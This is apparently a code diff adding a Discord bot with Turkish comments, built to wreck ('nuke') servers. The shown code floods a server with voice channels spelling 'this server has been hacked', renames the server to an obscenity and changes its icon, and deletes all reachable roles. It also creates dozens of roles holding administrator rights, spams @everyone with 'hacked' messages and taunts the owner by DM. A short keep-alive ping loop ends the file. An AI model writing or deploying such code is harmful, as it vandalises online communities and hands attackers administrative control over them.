+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("DOĞACAĞIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+                await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    
+            await msg.guild
+      .createChannel("BU SUNUCU", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKLENMİŞTİR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KOLAYDINIZ xD", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HÜKÜMDARLIĞIMIZ", {
+        type: "voice"
+      })   
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("SONSUZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("AFFETMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("YENİLMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KÜLLERİMİZDEN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("DOĞACAĞIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+                await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    
+            await msg.guild
+      .createChannel("BU SUNUCU", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKLENMİŞTİR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild  
+      .createChannel("KOLAYDINIZ xD", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HÜKÜMDARLIĞIMIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("SONSUZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("AFFETMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("YENİLMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KÜLLERİMİZDEN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("DOĞACAĞIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+                await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    
+            await msg.guild
+      .createChannel("BU SUNUCU", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKLENMİŞTİR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KOLAYDINIZ xD", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HÜKÜMDARLIĞIMIZ", {
+        type: "voice"     
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("SONSUZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("AFFETMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("YENİLMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KÜLLERİMİZDEN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("DOĞACAĞIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+                await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    
+            await msg.guild
+      .createChannel("BU SUNUCU", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKLENMİŞTİR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KOLAYDINIZ xD", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HÜKÜMDARLIĞIMIZ", {
+        type: "voice"
+      })  
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("SONSUZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("AFFETMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("YENİLMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KÜLLERİMİZDEN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("DOĞACAĞIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });                      
+                await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    
+    await msg.guild.setIcon("https://i.hizliresim.com/f14K3P.jpg");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
+    await msg.guild.setName("ャ TANER BABA SİKER ャ"); //SUNUCUNUN ISMINI DEGISTIRIR
+    await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
+    await client.user.setAvatar("https://i.hizliresim.com/JyUOid.jpg"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
+    await client.user.setUsername("ャ HACKED W/TANER ャ");    //BOTUN ISMİNİ DEGISTIRIR
+    await msg.guild.owner.send("**Sunucunu Hackledik Ağla :D**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
+    
+  }   
 });
+
+
+
+    client.on("message", msg => {
+  if (msg.content === "+rolspam") {  //ROL SPAM YAPAR
+    msg.delete();
+    msg.guild.createRole({
+      name: "HACKED",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+        msg.guild.createRole({
+      name: "HACKED",
+      color: "C22F2F",
+      permissions: ["ADMINISTRATOR"]
+    });
+            msg.guild.createRole({
+      name: "HACKED",
+      color: "E12020",
+      permissions: ["ADMINISTRATOR"]
+    });
+                msg.guild.createRole({
+      name: "HACKED",
+      color: "FF0000",
+      permissions: ["ADMINISTRATOR"]
+    });
+                msg.guild.createRole({
+      name: "HACKED",
+      color: "FF3E00",
+      permissions: ["ADMINISTRATOR"]
+    });
+                msg.guild.createRole({
+      name: "HACKED",
+      color: "FF4D00",
+      permissions: ["ADMINISTRATOR"]
+    });
+                msg.guild.createRole({
+      name: "HACKED",
+      color: "FF6C00",
+      permissions: ["ADMINISTRATOR"]
+    });
+                msg.guild.createRole({
+      name: "HACKED",
+      color: "FF9300",
+      permissions: ["ADMINISTRATOR"]
+    });
+                msg.guild.createRole({
+      name: "HACKED",
+      color: "FFAE00",
+      permissions: ["ADMINISTRATOR"]
+    });
+                msg.guild.createRole({
+      name: "HACKED",
+      color: "FFD500",
+      permissions: ["ADMINISTRATOR"]
+    });
+                msg.guild.createRole({
+      name: "HACKED",
+      color: "FFFF00",
+      permissions: ["ADMINISTRATOR"]
+    });
+                msg.guild.createRole({
+      name: "HACKED",
+      color: "E0FF00",
+      permissions: ["ADMINISTRATOR"]
+    });
+                msg.guild.createRole({
+      name: "HACKED",
+      color: "C1FF00",
+      permissions: ["ADMINISTRATOR"]
+    });
+                msg.guild.createRole({
+      name: "HACKED",
+      color: "93FF00",
+      permissions: ["ADMINISTRATOR"]
+    });
+                msg.guild.createRole({
+      name: "HACKED",
+      color: "74FF00",
+      permissions: ["ADMINISTRATOR"]
+    });
+                msg.guild.createRole({
+      name: "HACKED",
+      color: "3EFF00",
+      permissions: ["ADMINISTRATOR"]
+    });
+                msg.guild.createRole({
+      name: "HACKED",
+      color: "0CFF00",
+      permissions: ["ADMINISTRATOR"]
+    });
+                msg.guild.createRole({
+      name: "HACKED",
+      color: "00FF2E",
+      permissions: ["ADMINISTRATOR"]
+    });
+                msg.guild.createRole({
+      name: "HACKED",
+      color: "00FF6C",
+      permissions: ["ADMINISTRATOR"]
+    });
+                msg.guild.createRole({
+      name: "HACKED",
+      color: "00FFA6",
+      permissions: ["ADMINISTRATOR"] 
+    });
+                    msg.guild.createRole({
+      name: "HACKED",
+      color: "00FFD4",
+      permissions: ["ADMINISTRATOR"]
+    });
+                    msg.guild.createRole({
+      name: "HACKED",
+      color: "00FFFB",
+      permissions: ["ADMINISTRATOR"]
+    });
+                    msg.guild.createRole({
+      name: "HACKED",
+      color: "00C9FF",
+      permissions: ["ADMINISTRATOR"]
+    });
+                    msg.guild.createRole({
+      name: "HACKED",
+      color: "009BFF",
+      permissions: ["ADMINISTRATOR"]
+    });
+                    msg.guild.createRole({
+      name: "HACKED",
+      color: "006CFF",
+      permissions: ["ADMINISTRATOR"]
+    });
+                    msg.guild.createRole({
+      name: "HACKED",
+      color: "003AFF",
+      permissions: ["ADMINISTRATOR"]
+    });
+                    msg.guild.createRole({
+      name: "HACKED",
+      color: "001BFF",
+      permissions: ["ADMINISTRATOR"]
+    });
+                    msg.guild.createRole({
+      name: "HACKED",
+      color: "1F00FF",
+      permissions: ["ADMINISTRATOR"]
+    });
+                    msg.guild.createRole({
+      name: "HACKED",
+      color: "4200FF",
+      permissions: ["ADMINISTRATOR"]
+    });
+                    msg.guild.createRole({
+      name: "HACKED",
+      color: "7C00FF",
+      permissions: ["ADMINISTRATOR"]
+    });
+                    msg.guild.createRole({
+      name: "HACKED",
+      color: "A200FF",
+      permissions: ["ADMINISTRATOR"]
+    });
+                    msg.guild.createRole({
+      name: "HACKED",
+      color: "C500FF",
+      permissions: ["ADMINISTRATOR"]
+    });
+                    msg.guild.createRole({
+      name: "HACKED",
+      color: "E000FF",   
+      permissions: ["ADMINISTRATOR"]
+    });
+                    msg.guild.createRole({
+      name: "HACKED",
+      color: "FF00F3",
+      permissions: ["ADMINISTRATOR"]
+    });
+                    msg.guild.createRole({
+      name: "HACKED",
+      color: "FF00B6",
+      permissions: ["ADMINISTRATOR"]
+    });
+                    msg.guild.createRole({
+      name: "HACKED",
+      color: "FF0097",
+      permissions: ["ADMINISTRATOR"]
+    });
+                    msg.guild.createRole({
+      name: "HACKED",
+      color: "FF005D",
+      permissions: ["ADMINISTRATOR"]
+    });
+                    msg.guild.createRole({
+      name: "HACKED",
+      color: "FF0032",
+      permissions: ["ADMINISTRATOR"]
+    });
+  }
+});
+
+client.on('message', msg => {
+  if (msg.content === '+spam') { //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:');  
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:');   
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+  }
+});
+
+
+const http = require("http");
+const express = require("express");
+const app = express();
+    function sleep(milliseconds) {
+  var start = new Date().getTime();
+  for (var i = 0; i < 1e7; i++) { 
+    if ((new Date().getTime() - start) > milliseconds){         //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
+      break;
+    }
+  }    
+}
+app.get("/", (request, response) => {
+  console.log(Date.now() + " Ping tamamdır.");  
+  response.sendStatus(200);
+});
+app.listen(process.env.PORT);
+setInterval(() => {
+  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);   //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
+}, 3000);
